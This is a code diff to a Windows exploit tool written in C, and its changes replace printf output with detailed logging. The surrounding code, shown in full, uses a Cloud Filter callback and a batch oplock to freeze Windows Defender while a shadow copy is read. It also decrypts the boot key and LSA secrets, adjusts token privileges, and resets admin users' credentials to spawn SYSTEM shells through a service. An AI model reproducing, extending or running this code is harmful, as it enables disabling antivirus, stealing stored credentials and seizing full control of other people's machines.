@@ -1741,17 +1741,16 @@ void CfCallbackFetchPlaceHolders(
 	_In_ CONST CF_CALLBACK_PARAMETERS* CallbackParameters
 ) {
 
-	printf("CfCallbackFetchPlaceHolders triggered !\n");
-
 	CF_PROCESS_INFO* cpi = CallbackInfo->ProcessInfo;
 	wchar_t* procname = PathFindFileName(cpi->ImagePath);
-	printf("Directory query from %ws\n", procname);
+	LOG_INFO("CLOUDF", "CfCallbackFetchPlaceholders triggered: caller=%ws (PID=%d), WD_PID=%d",
+		procname, cpi->ProcessId, GetWDPID());
 	if (GetWDPID() == cpi->ProcessId)
 	{
 		cldcallbackctx* ctx = (cldcallbackctx*)CallbackInfo->CallbackContext;
 		SetEvent(ctx->hnotifywdaccess);;
 
-		printf("Defender flagged.\n");
+		LOG_OK("CLOUDF", "Windows Defender process matched! PID=%d, image=%ws", cpi->ProcessId, cpi->ImagePath);
 		CF_OPERATION_INFO cfopinfo = { 0 };
 		cfopinfo.StructSize = sizeof(CF_OPERATION_INFO);
 		cfopinfo.Type = CF_OPERATION_TYPE_TRANSFER_PLACEHOLDERS;
@@ -1796,7 +1795,10 @@ void CfCallbackFetchPlaceHolders(
 
 		WaitForSingleObject(ctx->hnotifylockcreated, INFINITE);
 		HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
-		printf("CfExecute returned : 0x%0.8X\n", hs);
+		if (SUCCEEDED(hs))
+			LOG_OK("CLOUDF", "CfExecute (WD branch) succeeded: hr=0x%08X", (unsigned)hs);
+		else
+			LOG_ERR("CLOUDF", "CfExecute (WD branch) FAILED: hr=0x%08X", (unsigned)hs);
 		return;
 	}
 	CF_OPERATION_INFO cfopinfo = { 0 };
@@ -1814,7 +1816,10 @@ void CfCallbackFetchPlaceHolders(
 	cfopparams.TransferPlaceholders.Flags = CF_OPERATION_TRANSFER_PLACEHOLDERS_FLAG_NONE;
 	cfopparams.TransferPlaceholders.PlaceholderArray = { 0 };
 	HRESULT hs = CfExecute(&cfopinfo, &cfopparams);
-	printf("CfExecute : 0x%0.8X\n", hs);
+	if (SUCCEEDED(hs))
+		LOG_INFO("CLOUDF", "CfExecute (non-WD, empty placeholders) succeeded: hr=0x%08X", (unsigned)hs);
+	else
+		LOG_WARN("CLOUDF", "CfExecute (non-WD) returned hr=0x%08X", (unsigned)hs);
 
 	return;
 
@@ -1867,7 +1872,8 @@ DWORD WINAPI FreezeVSS(void* arg)
 	callbackctx.hnotifylockcreated = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!callbackctx.hnotifylockcreated || !callbackctx.hnotifywdaccess)
 	{
-		printf("Failed to create event, error : %d", GetLastError());
+		LOG_ERR("FREEZEVSS", "CreateEvent failed: hnotifylockcreated=0x%p hnotifywdaccess=0x%p",
+			(void*)callbackctx.hnotifylockcreated, (void*)callbackctx.hnotifywdaccess);
 		retval = GetLastError();
 		goto cleanup;
 	}
@@ -1876,59 +1882,68 @@ DWORD WINAPI FreezeVSS(void* arg)
 	hlock = CreateFile(lockfile, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED | FILE_FLAG_DELETE_ON_CLOSE, NULL);
 	if (!hlock || hlock == INVALID_HANDLE_VALUE)
 	{
-		printf("Failed to create lock file %ws error : %d", lockfile, GetLastError());
+		LOG_ERR("FREEZEVSS", "CreateFile(%ws) failed", lockfile);
 		retval = GetLastError();
 		goto cleanup;
 	}
+	LOG_OK("FREEZEVSS", "Lock file created: %ws, handle=0x%p", lockfile, (void*)hlock);
 
 
 	//CreateDirectory(syncroot, NULL);
+	LOG_INFO("FREEZEVSS", "Registering sync root: %ws (provider=%ws)", syncroot, cfreg.ProviderName);
 	hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_NONE);
 	if (hs)
 	{
-		printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
+		LOG_ERR("FREEZEVSS", "CfRegisterSyncRoot(%ws) failed: hr=0x%08X", syncroot, (unsigned)hs);
 		retval = ERROR_UNIDENTIFIED_ERROR;
 		goto cleanup;
 	}
+	LOG_OK("FREEZEVSS", "Sync root registered: %ws", syncroot);
 	syncrootregistered = true;
 	hs = CfConnectSyncRoot(syncroot, callbackreg, &callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
 	if (hs)
 	{
-		printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
+		LOG_ERR("FREEZEVSS", "CfConnectSyncRoot(%ws) failed: hr=0x%08X", syncroot, (unsigned)hs);
 		retval = ERROR_UNIDENTIFIED_ERROR;
 		goto cleanup;
 	}
+	LOG_OK("FREEZEVSS", "Sync root connected, cfkey=0x%llX", cfkey.Internal);
 	if (args->hlock) {
 		CloseHandle(args->hlock);
 		args->hlock = NULL;
 	}
 
-	printf("Waiting for callback...\n");
+	LOG_INFO("FREEZEVSS", "Waiting for WD to access placeholder directory (hnotifywdaccess)...");
 
 	WaitForSingleObject(callbackctx.hnotifywdaccess, INFINITE);
+	LOG_OK("FREEZEVSS", "WD accessed the placeholder - proceeding to oplock lock file");
 
 	ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	if (!ovd.hEvent)
 	{
-		printf("Failed to create event, error : %d\n", GetLastError());
+		LOG_ERR("FREEZEVSS", "CreateEvent for oplock overlapped failed");
 		retval = GetLastError();
 		goto cleanup;
 	}
+	SetLastError(ERROR_SUCCESS);
+	LOG_INFO("FREEZEVSS", "Requesting FSCTL_REQUEST_BATCH_OPLOCK on lock file...");
 	DeviceIoControl(hlock, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
 
 	if (GetLastError() != ERROR_IO_PENDING)
 	{
-		printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+		LOG_ERR("FREEZEVSS", "FSCTL_REQUEST_BATCH_OPLOCK on lock file failed (not IO_PENDING)");
 		retval = GetLastError();
 		goto cleanup;
 	}
+	LOG_OK("FREEZEVSS", "Oplock request pending on lock file");
 	SetEvent(callbackctx.hnotifylockcreated);
+	LOG_INFO("FREEZEVSS", "hnotifylockcreated signaled - CfExecute will now proceed in callback");
 
-	printf("Waiting for oplock to trigger...\n");
+	LOG_INFO("FREEZEVSS", "Waiting for oplock to be broken (WD opening lock file => WD frozen)...");
 
 	GetOverlappedResult(hlock, &ovd, &nwf, TRUE);
 
-	printf("WD is frozen and the new VSS can be used.\n");
+	LOG_OK("FREEZEVSS", "Oplock broken - WD thread is now frozen, VSS is accessible");
 
 	SetEvent(args->hvssready);
 
@@ -2251,7 +2266,7 @@ bool GetLSASecretKey(unsigned char bootkeybytes[16])
 
 	if (strlen(data) < 16)
 	{
-		printf("Boot key mismatch.");
+		LOG_ERR("BOOTKEY", "Boot key mismatch: hex string length=%d (expected >=16), data='%s'", (int)strlen(data), data);
 		return 1;
 	}
 
@@ -2402,7 +2417,7 @@ void* UnprotectPasswordEncryptionKeyAES(char* data, char* lsaKey, int* keysz)
 
 	if (memcmp(hash256, hash, sizeof(hash256)) != 0)
 	{
-		printf("Invalid AES password key.\n");
+		LOG_ERR("CRYPTO", "AES password key validation failed: SHA256 mismatch (data corrupted or wrong LSA key?)");
 		return NULL;
 	}
 	if (keysz)
@@ -2836,7 +2851,7 @@ BOOL SetPrivilege(
 		lpszPrivilege,   // privilege to lookup 
 		&luid))        // receives LUID of privilege
 	{
-		printf("LookupPrivilegeValue error: %u\n", GetLastError());
+		LOG_ERR("PRIV", "LookupPrivilegeValue(%ws) failed", lpszPrivilege);
 		return FALSE;
 	}
 
@@ -2857,16 +2872,16 @@ BOOL SetPrivilege(
 		(PTOKEN_PRIVILEGES)NULL,
 		(PDWORD)NULL))
 	{
-		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+		LOG_ERR("PRIV", "AdjustTokenPrivileges(%ws) failed", lpszPrivilege);
 		return FALSE;
 	}
 
 	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-
 	{
-		printf("The token does not have the specified privilege. \n");
+		LOG_WARN("PRIV", "AdjustTokenPrivileges(%ws): privilege not assigned (token lacks it)", lpszPrivilege);
 		return FALSE;
 	}
+	LOG_OK("PRIV", "%ws privilege %s on token=0x%p", lpszPrivilege, bEnablePrivilege ? "enabled" : "disabled", (void*)hToken);
 
 	return TRUE;
 }
@@ -3136,7 +3151,7 @@ bool DoSpawnShellAsAllUsers(HANDLE samfile)
 
 
 
-						printf("    IsAdmin : TRUE\n");
+						LOG_OK("TOKEN", "  IsAdmin: TRUE - %ws qualifies for SYSTEM shell escalation", username);
 						HANDLE htoken2 = NULL;
 						LOG_INFO("TOKEN", "LogonUserEx(BATCH) for %ws...", username);
 						if (!LogonUserEx(username, NULL, newpassword_unistr, LOGON32_LOGON_BATCH, LOGON32_PROVIDER_DEFAULT, &htoken2, &logonsid, NULL, NULL, NULL))
@@ -3198,7 +3213,7 @@ bool DoSpawnShellAsAllUsers(HANDLE samfile)
 						}
 						else {
 							LOG_OK("SVC", "Service created successfully");
-							printf("    SYSTEMShell : OK.\n");
+							LOG_OK("SVC", "SYSTEM shell will be launched via service: %ws", wuid2);
 						}
 
 						LOG_INFO("SVC", "Starting service...");
@@ -3267,7 +3282,7 @@ bool IsRunningAsLocalSystem()
 
 	HANDLE htoken = NULL;
 	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
-		printf("OpenProcessToken failed, error : %d\n", GetLastError());
+		LOG_ERR("TOKEN", "OpenProcessToken(TOKEN_QUERY) failed");
 		return false;
 	}
 	TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
